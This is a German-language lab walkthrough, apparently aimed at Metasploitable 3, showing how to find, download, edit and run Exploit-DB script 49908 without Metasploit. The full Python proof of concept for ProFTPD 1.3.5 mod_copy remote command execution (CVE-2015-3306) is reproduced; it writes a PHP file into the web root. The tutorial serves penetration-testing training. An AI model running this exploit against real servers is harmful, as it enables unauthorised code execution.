# Exploit ohne Metasploit starten

## Exploit suchen

Als erstes sollte man nach dem Exploit suchen für die Schwachstelle:

``` bash
searchsploit ProFTPD 1.3.5
```

![Bild01.jpg](/images/Metaspolitable-3/Exploit_ohne_Metasploit/Bild01.jpg)

## Exploit herunterladen

Nachdem man den richtigen exploit gefunden hat kann man ihn mit dem folgenden befehl herunterladen:

``` bash
searchsploit -m linux/remote/49908.py
```

![Bild02.jpg](/images/Metaspolitable-3/Exploit_ohne_Metasploit/Bild02.jpg)

## Exploit anpassen

Ab diesem punkt wird es anderst für jeden Exploit. Du musst den heruntergeladenen Exploit durchlesen und verstehen wie er funktioniert, damit man ihn so anpassen kann das er für dich funktioniert.

``` bash
nano 49908.py
```

``` bash title="49908.py"
# Exploit Title: ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)
# Date: 25/05/2021
# Exploit Author: Shellbr3ak
# Version: 1.3.5 
# Tested on: Ubuntu 16.04.6 LTS
# CVE : CVE-2015-3306

#!/usr/bin/env python3

import sys
import socket
import requests

def exploit(client, target):
    client.connect((target,21)) # Connecting to the target server
    banner = client.recv(74)
    print(banner.decode())
    client.send(b'site cpfr /etc/passwd\r\n')
    print(client.recv(1024).decode())
    client.send(b'site cpto <?php phpinfo(); ?>\r\n') # phpinfo() is just a PoC.
    print(client.recv(1024).decode())
    client.send(b'site cpfr /proc/self/fd/3\r\n')
    print(client.recv(1024).decode())
    client.send(b'site cpto /var/www/html/test.php\r\n')
    print(client.recv(1024).decode())
    client.close()
    print('Exploit Completed')

def check(url):
    req = requests.get(url) # Requesting the written PoC php file via HTTP
    if req.status_code == 200:
        print('[+] File Written Successfully')
        print(f'[+] Go to : {url}')
    else:
        print('[!] Something Went Wrong')
        print('[!] Directory might not be writable')

def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target = sys.argv[1]
    exploit(client, target)
    url = 'http://' + target + '/test.php'
    check(url)

if __name__ == '__main__':
    main()
```

## Exploit ausführen

Exploit ausführbar machen und ausführen:

``` bash
chmod +x 49908.py
python3 49908.py <IP-Adresse>
```

![Bild03.jpg](/images/Metaspolitable-3/Exploit_ohne_Metasploit/Bild03.jpg)

Man könnte auch noch auf der Website kontrollieren ob es funktioniert hat:

![Bild04.jpg](/images/Metaspolitable-3/Exploit_ohne_Metasploit/Bild04.jpg)